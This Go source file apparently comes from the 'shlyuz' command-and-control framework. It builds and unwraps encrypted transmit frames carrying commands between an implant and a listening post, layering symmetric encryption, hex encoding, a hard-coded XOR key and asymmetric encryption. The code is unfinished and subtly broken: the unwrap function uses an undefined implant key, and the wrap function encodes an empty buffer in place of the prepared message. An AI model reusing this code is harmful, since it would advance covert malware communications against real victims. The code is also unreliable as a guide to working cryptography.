package routine

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/crypto/symmetric"
	shlyuzHex "shlyuz/pkg/encoding/hex"
	"shlyuz/pkg/encoding/xor"
)

// TODO: This is read from a config
const XORKEY = 12

type DataFrame struct {
	component_id string
	cmd          string
	args         []string
}

type EncryptedFrame struct {
	frame_id  int
	data      []byte
	chunk_len int
}

type PreparedChunkFrame struct {
	symKey  []byte
	message []byte
}

// TODO: Get INIT Signature

func PrepareTransmitFrame(dataFrame DataFrame, lpPubKey asymmetric.PublicKey) []byte {
	symMsg := symmetric.Encrypt([]byte(fmt.Sprintf("%v", dataFrame)))

	var encryptedSymMsg bytes.Buffer
	binary.Write(&encryptedSymMsg, binary.BigEndian, symMsg.Message)
	symMsgFrame := EncryptedFrame{0, encryptedSymMsg.Bytes(), len(encryptedSymMsg.Bytes())}

	chunkFrame, err := json.Marshal(symMsgFrame)
	if err != nil {
		log.Println("invalid dataframe")
	}
	hexChunkFrame := shlyuzHex.Encode(chunkFrame)
	xorHexChunkFrame := xor.XorMessage(hexChunkFrame, XORKEY)

	hexKey := make([]byte, hex.EncodedLen(len(symMsg.Key)))
	hex.Encode(hexKey, symMsg.Key)
	hexedHexKey := make([]byte, hex.EncodedLen(len(hexKey)))
	hex.Encode(hexedHexKey, hexKey)

	// TODO: prepend hexedHexKey to xorHexChunkFrame, then change xorHexChunkFrame to whatever that var is
	chunkFrameBytes := [][]byte{hexedHexKey, xorHexChunkFrame}
	noSep := []byte(nil)
	chunkMsg := bytes.Join(chunkFrameBytes, noSep)

	preparedChunkFrame := new(PreparedChunkFrame)
	preparedChunkFrame.symKey = symMsg.Key
	preparedChunkFrame.message = chunkMsg
	var preparedChunkBuffer bytes.Buffer
	binary.Write(&preparedChunkBuffer, binary.BigEndian, preparedChunkFrame.message)

	hexedXorHexChunkFrame := make([]byte, len(preparedChunkBuffer.Bytes()))
	hexedXorHexChunkFrame = shlyuzHex.Encode(hexedXorHexChunkFrame)

	_, ImpPrivKey, err := asymmetric.GenerateKeypair()
	if err != nil {
		log.Println("Unable to generate key pair")
	}

	encBox := new(asymmetric.AsymmetricBox)
	*encBox = asymmetric.Encrypt(hexedXorHexChunkFrame, lpPubKey, ImpPrivKey)

	// TODO: prepend the init_signature to encBox.Message and return that
	return encBox.Message
}

func UnwrapTransmitFrame(transmitFrame []byte, lpPubKey asymmetric.PublicKey) []byte {
	decryptionBox := new(asymmetric.AsymmetricBox)
	decryptionBox.Message = transmitFrame
	// TODO: Get the implant's current private key
	decBox, boolAsymSuccess := asymmetric.Decrypt(*decryptionBox, lpPubKey, ImpPrivKey)
	if boolAsymSuccess != true {
		log.Println("invalid transmit frame")
	}
	symKey := make([]byte, hex.DecodedLen(len(decBox.Message[0:44])))
	rawSymKey := decBox.Message[0:44]
	hex.Decode(symKey, rawSymKey)

	unxorFrame := xor.XorMessage(decBox.Message, XORKEY)
	uncFrame := shlyuzHex.Decode(unxorFrame)

	hexFrame := uncFrame[44:]
	recvMsg := symmetric.Decrypt(hexFrame, symKey)
	if recvMsg.IsEncrypted != true {
		log.Println("unable to extract raw message from transmit frame")
	}
	return recvMsg.Message
}
